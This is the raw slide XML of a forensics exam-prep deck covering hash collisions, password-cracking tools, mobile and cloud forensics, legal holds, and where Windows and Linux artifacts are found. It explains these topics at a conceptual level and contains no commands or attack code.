              <a:t>•  Analysts care because hashing is the backbone of evidence verification, malware identification via known-bad hash lists, and file integrity monitoring, and a collision weakness can let malicious content masquerade as trusted.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="1">
                <a:solidFill>
                  <a:srgbClr val="10B981"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  On the exam: Expect questions distinguishing weak hashes (MD5/SHA-1, collision-prone) from strong ones (SHA-256) and recognizing that a collision means two different files share one digest.</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704</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide7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3 · FORENSICS ACQUISITION TOOLS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Hash Collisions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g_da3cc4c7c3.png"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId2"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="2119855" y="1783080"/>
            <a:ext cx="7949241" cy="4434840"/>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705</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide7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3 · FORENSICS ACQUISITION TOOLS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dd Demo</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g_a056dc1946.png"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId2"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="2165714" y="1783080"/>
            <a:ext cx="7857524" cy="4434840"/>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706</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide7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3 · FORENSICS ACQUISITION TOOLS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Special Topic: Password Cracking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Password cracking recovers plaintext passwords from captured hashes and is used both by attackers and by forensic examiners who must access protected evidence, typically through dictionary, brute-force, rule-based, or mask attacks against a hash.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Open-source tools such as hashcat support well over 200 hash types and, in their GPU-accelerated form historically branded oclHashcat, use graphics processors to test billions of candidate hashes per second.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Commercial forensic suites from vendors like ElcomSoft and Passware, including the Passware Kit Forensic that can operate standalone or integrated with EnCase, provide similar cracking across many hash and encryption types with a workflow geared to investigations.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Analysts study these tools to understand attacker capabilities, to justify strong hashing and long complex passwords with salting, and to lawfully access encrypted evidence during an investigation.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="1">
                <a:solidFill>
                  <a:srgbClr val="10B981"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  On the exam: Know hashcat as the GPU-accelerated open-source cracker and Passware/ElcomSoft as commercial forensic options, and expect password cracking to reinforce why salted, strong hashes resist recovery.</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707</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide7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3 · FORENSICS ACQUISITION TOOLS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Special Topic: Password Cracking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Open source</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  hashcat</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="2">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>·  Over 200 hash types</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="2">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>·  oclhashcat- GPU acceleration</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Commercial</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  ElcomSoft</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Passware</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="2">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>·  Passware Kit Forensic</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="2">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>·  Individually or with EnCase suite</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="2">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>·  Over 200 hash types</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="2">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>·  GPU acceleration</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708</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide7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3 · MOBILE, VIRTUALIZATION, AND CLOUD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Mobile Device Forensics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Mobile device forensics is the practice of acquiring and analyzing data from smartphones and tablets, which is often harder than disk forensics because the operating systems are closed and proprietary and the storage cannot be imaged as easily as a removable hard drive.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Because these devices constantly communicate with cellular, Wi-Fi, and Bluetooth networks, an attacker or owner can issue a remote-wipe or remote-lock command that alters or destroys evidence, so investigators isolate the device using a Faraday bag or Faraday cage that blocks all radio-frequency (RF) signaling.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Direct access to the device's data is typically not possible through the normal interface, so analysts rely on specialized mobile forensics hardware and software such as Cellebrite UFED or Magnet AXIOM to extract data through logical, file-system, or physical acquisition methods.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  A SOC or forensic analyst cares because mobile devices hold rich evidence such as call logs, messages, location history, and app data, and losing that evidence to a remote wipe or an improper acquisition can break the case and the chain of custody.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="1">
                <a:solidFill>
                  <a:srgbClr val="10B981"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  On the exam: Expect scenario questions where an analyst must preserve a seized phone and choose a Faraday bag or specialized mobile forensic tooling to prevent remote wiping and maintain evidence integrity.</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709</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide7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3 · MOBILE, VIRTUALIZATION, AND CLOUD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Mobile Device Forensics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Can be difficult</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  OS is closed</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Communicate with outside world</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Remote access can alter evidence</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Faraday device</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Blocks RF signaling</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Difficult to directly access a device’s data</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Need special mobile forensics software and hardware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710</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide7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3 · MOBILE, VIRTUALIZATION, AND CLOUD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Virtualization and the Cloud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When incidents occur on virtual machines or in cloud environments, the forensic approach shifts because the analyst rarely has physical access to the underlying host hardware and instead works with virtualized abstractions of storage, memory, and network.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Service Level Agreements (SLAs) and the cloud shared-responsibility model can legally and technically limit forensic activities, since the provider owns the hypervisor and physical layer and may not grant the tenant access to logs or disk images below the guest OS.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  A key advantage of virtualization is the snapshot, which captures the complete state of a VM including its memory and disk at a point in time, and a properly taken and hashed snapshot can serve as forensically sound evidence preservation of the system as it existed during the incident.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Analysts care because they must plan acquisitions around what the provider will allow, request logs early, and capture snapshots quickly before auto-scaling or ephemeral instances destroy the evidence.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="1">
                <a:solidFill>
                  <a:srgbClr val="10B981"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  On the exam: Look for questions on how cloud SLAs and shared responsibility limit an analyst's access to underlying hardware, and how VM snapshots are used to capture forensically sound evidence.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711</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide7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3 · MOBILE, VIRTUALIZATION, AND CLOUD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Virtualization and the Cloud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SLAs may limit forensic activities</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="2000" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Snapshots</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Forensically-sound evidence preservation</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712</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide7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3 · MOBILE, VIRTUALIZATION, AND CLOUD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Legal Hold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A legal hold is a formal, court-driven or counsel-driven obligation to preserve all data and evidence relevant to anticipated or ongoing litigation, suspending normal deletion and retention schedules so nothing potentially relevant is destroyed.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  For evidence to be admissible in a court of law it must be shown to be in its original, unaltered state, and the legal hold ensures that state is maintained; the original evidence generally cannot be returned to its owner until the trial concludes.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Because keeping the physical original out of production is often impractical, a verified forensic image, one whose cryptographic hash matches the source and whose acquisition is documented, can suffice as forensically sound evidence in place of the original.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  A security analyst cares because failing to honor a legal hold can lead to spoliation sanctions and destroyed evidence, so IR playbooks must trigger preservation and proper imaging the moment litigation is reasonably anticipated.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="1">
                <a:solidFill>
                  <a:srgbClr val="10B981"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  On the exam: Expect questions distinguishing a legal hold obligation to preserve evidence from routine retention, and recognizing that verified forensic images can substitute for the original device during litigation.</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713</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide7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3 · MOBILE, VIRTUALIZATION, AND CLOUD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Legal Hold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In a court of law, admissible evidence must be in original state</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="2000" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Legal hold is required by the court to retain evidence</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Evidence can’t be returned to owner until after the trial</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="2000" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Verified images can suffice as forensically-sound</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714</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide7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3 · FORENSICS ANALYSIS: PART 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Forensics Analysis, I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Manual forensic analysis means examining a system's operating system and running processes directly using log viewers and native artifacts rather than relying on an all-in-one commercial suite.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  On Windows, key evidence sources include the Event Viewer, which holds the Security, System, and Application logs, and the Registry, which records installed software, user activity, run keys, and persistence mechanisms.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  On Linux, analysts examine standard directories such as /etc/ for configuration files, /var/log/ for system and application logs like auth.log and syslog, and /home/ for per-user files, histories, and artifacts.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  A SOC analyst cares because knowing exactly where artifacts live lets them quickly validate an alert, reconstruct attacker actions, and pull evidence even when specialized tooling is unavailable.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="1">
                <a:solidFill>
                  <a:srgbClr val="10B981"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  On the exam: Look for questions asking where specific artifacts live, such as the Windows Registry and Event Viewer versus Linux paths like /var/log, /etc, and /home.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715</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide7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3 · FORENSICS ANALYSIS: PART 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Forensics Analysis, I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Manually</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Operating system and processes</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Log viewers</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Windows</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="2">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>·  Event Viewer</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="2">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>·  Registry</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Linux directories</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="2">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>·  /etc/</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="2">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>·  /var/log/</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="2">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>·  /home/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716</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide7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3 · FORENSICS ANALYSIS: PART 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Windows Utilities Demo</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g_5e96aa3087.png"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId2"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="1466216" y="1783080"/>
            <a:ext cx="9256519" cy="4434840"/>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717</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide7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3 · FORENSICS ANALYSIS: PART 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Linux Forensics Demo</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g_6438df1292.png"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId2"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="2973181" y="1783080"/>
            <a:ext cx="6242590" cy="4434840"/>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718</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide7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3 · FORENSICS ANALYSIS: PART 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Forensics Analysis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Beyond manual review, analysts use dedicated forensic solutions to acquire, index, and analyze evidence at scale while preserving integrity and chain of custody.</a:t>
            </a:r>
          </a:p>
          <a:p>
